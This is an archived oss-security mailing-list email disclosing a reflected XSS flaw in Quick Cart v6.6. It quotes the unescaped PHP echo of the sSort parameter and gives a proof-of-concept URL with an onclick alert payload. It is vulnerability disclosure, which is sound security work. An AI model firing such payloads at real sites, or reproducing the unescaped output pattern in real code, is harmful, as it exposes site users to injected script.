X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1290" "Tuesday" "19" "January" "2016" "18:12:57" "+0530" "Rahul Pratap Singh" "techno.rps@gmail.com" "<CADLX=aGK=sSvmbLxd-HaExNsVSVak64Xr6-nLVY6kXqvRT4iaw@mail.gmail.com>" "46" "[oss-security] CVE Request: Quick Cart v6.6 XSS Vulnerability" nil nil nil "1" "2016011912:42:57" "[oss-security] CVE Request: Quick Cart v6.6 XSS Vulnerability" (number mark "U       techno.rps@g Jan 19   46/1290  " thread-indent "\"[oss-security] CVE Request: Quick Cart v6.6 XSS Vulnerability\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 23822 invoked by uid 550); 19 Jan 2016 17:17:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29845 invoked from network); 19 Jan 2016 12:43:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=1omYP4jUyHPL+Nrtt5GH53aAA4+aQ/f19cJf6x44E8A=;
        b=PICSm1hCZgigQ6AqsgClmxiIRJR0v8VuadRo27a+/rHeLY7VleF+9fJPNmcO/glcPQ
         XsZ/pLh5gh9I3jMYUpy13iwOdXEiGaOLnFG/7yCl0KnuujIbvoNzxwzPRLPjhd7SbNu5
         QgKO1d0fk6G8XYY0IVgzXtyMb7P61dTiNm/rq3o5GGKv+kAwAZlwtiadzjc/gvL7kaLI
         c4td724nBU+q/kITkF6vXcs8nDz8kvIDesKf6B/tMqpljhnWcoKiwTdBJDc6e8w6kRQz
         /p8oHTAz8+NCD+VJ04bEu8JJtmnOC1heQJFNsO/srhGurLn5J0X+EJDnpZmtH47o91G9
         QyIA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:date:message-id:subject:from:to
         :content-type;
        bh=1omYP4jUyHPL+Nrtt5GH53aAA4+aQ/f19cJf6x44E8A=;
        b=IkrTLVvG7ofS12McJVWEUXBrtxJNnPVyUgb5J4h2/a4KDl8N2LMj6UqZS/GnPJa1zn
         /U2Mb/6kCySWQanRwyHayX5/zIRyktKiuwzWLCw66WZkBKjbG+9/HswkX4sex2OGgWuU
         S5Swk43aFItmoC3T4soIqNLAJDloMn2nHbjxbEa88JhTS5gptbBeOpUqNic8fR3uIRpf
         0QjN6xaExqdc41taLHk8Q+2db5Im1zQKPjPOpaGJ2iwf7+tvDKlc8VBDx05wGjqdejXo
         gTtDmEPeD6KrnMxQ4fRTl9MJk0Wk89susnsK5d9a+//GJCjFGJGZLWCzPIAiwLr0BB+x
         SaDg==
X-Gm-Message-State: AG10YOQGSA3tJfUghIcArdjM/x7hRNJa1tfnEqe+cDlkyCEWacekOmktoervJHn2+3NrE3SO8XkWBEF79QEdEg==
MIME-Version: 1.0
X-Received: by 10.50.43.162 with SMTP id x2mr14550315igl.72.1453207377392;
 Tue, 19 Jan 2016 04:42:57 -0800 (PST)
Date: Tue, 19 Jan 2016 18:12:57 +0530
Message-ID: <CADLX=aGK=sSvmbLxd-HaExNsVSVak64Xr6-nLVY6kXqvRT4iaw@mail.gmail.com>
From: Rahul Pratap Singh <techno.rps@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=089e0103e4ce83bbe60529af352b
Subject: [oss-security] CVE Request: Quick Cart v6.6 XSS Vulnerability

--089e0103e4ce83bbe60529af352b
Content-Type: text/plain; charset=UTF-8

## FULL DISCLOSURE

#Product    : Quick Cart
#Version    : 6.6
#Home page Link  : http://opensolution.org/home.html
#Date        : 19/Jan/2016

XSS Vulnerability:

----------------------------------------
Description:
----------------------------------------
 "sSort" parameter is not sanitized that leads to Reflected XSS.

----------------------------------------
Vulnerable Code:
----------------------------------------
File Name: products.php

Found at line:26
<?php if( isset( $sSort ) ) echo '<input type="hidden" name="sSort"
value="'.$sSort.'" />'; ?>

----------------------------------------
Exploit:
----------------------------------------
localhost/Quick.Cart_v6.6/admin.php?p=pages-list&sSort="%20onclick="alert(1)&sPhrase=

----------------------------------------
POC:
----------------------------------------
https://0x62626262.files.wordpress.com/2016/01/quick-cartv6-6xsspoc.png


Disclosure Timeline:
Tried to contact vendor via email  : 14/1/2016 ( email bounce back)
Tried to contact vendor via forum : 18/1/2016 (thread deleted, no response)
Public Disclosure: 19/1/2016

Pub ref:
https://0x62626262.wordpress.com/2016/01/19/quick-cart-v-6-6-xss-vulnerability

--089e0103e4ce83bbe60529af352b--
